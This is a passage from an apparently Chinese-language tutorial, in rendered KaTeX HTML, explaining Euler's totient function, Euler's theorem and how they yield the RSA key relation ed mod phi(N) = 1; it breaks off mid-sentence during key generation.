stretchy="false">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><mn>5</mn></mfrac><mo stretchy="false">)</mo><mo>=</mo><mn>40.</mn></mrow><annotation encoding="application/x-tex">\varphi(100)=100\times(1-\dfrac{1}{2})\times(1-\dfrac{1}{5})=40.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">0</span><span class="mord">.</span></span></span></span></span></p><p>对于任意正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>，假设其各个质因数为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，那么其欧拉函数的值为</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mi>i</mi></msub></mfrac><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\varphi(x)=x\prod^n_{i=1}(1-\dfrac{1}{p_i}).</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.20188em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mord">.</span></span></span></span></span></p><p>显然，这样计算一个正整数的欧拉函数是很复杂的。但如果上式中的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>是质数呢？问题就变得非常简单，因为这时<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub><mo>=</mo><mo stretchy="false">{</mo><mi>x</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">P_i=\{x\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">x</span><span class="mclose">}</span></span></span></span>。于是我们可以知道，质数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>的欧拉函数为</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mo>−</mo><mn>1.</mn></mrow><annotation encoding="application/x-tex">\varphi(p)=p-1.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">.</span></span></span></span></span></p><p>同样的，如果对于两个互质的正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p,q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，其乘积的欧拉函数就等于欧拉函数的乘积，即</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo>×</mo><mi>q</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>×</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\varphi(p\times q)=\varphi(p)\times \varphi(q).</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mord">.</span></span></span></span></span></p><p>这为我们求解欧拉函数提供了一个很好的解决方式。</p><h3 id="欧拉定理"><a class="markdownIt-Anchor" href="#欧拉定理"></a> 欧拉定理</h3><p>  欧拉定理是数论中的重要定理，我们这里只做介绍，不作证明。欧拉定理说的是，对于互质的两正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>，满足以下关系恒成立：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mtext> </mtext><mo stretchy="false">(</mo><mtext>mod </mtext><mi>n</mi><mo stretchy="false">)</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">m^{\varphi(n)}\equiv1\ (\textrm{mod}\ n),</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mpunct">,</span></span></span></span></span></p><p>我们对上式两边同时取<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>次幂，得到</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mrow><mi>k</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mtext> </mtext><mo stretchy="false">(</mo><mtext>mod </mtext><mi>n</mi><mo stretchy="false">)</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">m^{k\varphi(n)}\equiv1\ (\textrm{mod}\ n),</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mpunct">,</span></span></span></span></span></p><p>两边同时乘上<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>，有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mrow><mi>k</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mo>≡</mo><mi>m</mi><mtext> </mtext><mo stretchy="false">(</mo><mtext>mod </mtext><mi>n</mi><mo stretchy="false">)</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">m^{k\varphi(n)+1}\equiv m\ (\textrm{mod}\ n),</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mpunct">,</span></span></span></span></span></p><p>改写得到</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mrow><mi>k</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mtext> mod </mtext><mi>n</mi><mo>=</mo><mi>m</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">m^{k\varphi(n)+1}\ \textrm{mod}\ n= m.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord">.</span></span></span></span></span></p><p>这是我们需要的欧拉定理的形式。</p><h2 id="密钥的生成"><a class="markdownIt-Anchor" href="#密钥的生成"></a> 密钥的生成</h2><p>  读者是否还记得我们在确定算法的时候找到了公钥和私钥的关系式？即</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mrow><mi>e</mi><mi>d</mi></mrow></msup><mtext> mod </mtext><mi>N</mi><mo>=</mo><mi>m</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">m^{ed}\ \textrm{mod}\ N=m.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord">.</span></span></span></span></span></p><p>与我们得到的欧拉定理的形式</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mrow><mi>k</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mtext> mod </mtext><mi>n</mi><mo>=</mo><mi>m</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">m^{k\varphi(n)+1}\ \textrm{mod}\ n=m.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord">.</span></span></span></span></span></p><p>相比，我们发现，这时我们只需要使得</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>e</mi><mi>d</mi><mo>=</mo><mi>k</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mtext>，</mtext></mrow><annotation encoding="application/x-tex">ed=k\varphi(N)+1，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span></span></span></span></span></p><p>即对于任何一个公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span></span></span></span>，我们私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>的生成方式为计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>使得</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>e</mi><mi>d</mi><mtext> mod </mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1.</mn></mrow><annotation encoding="application/x-tex">ed\ \textrm{mod}\ \varphi(N)=1.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">.</span></span></span></span></span></p><p>这时我们可以利用到一条数学定理：如果两正整数互质（这里表现为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>互质），那么一定存在<span class="katex"><span class="katex-mathml"><math 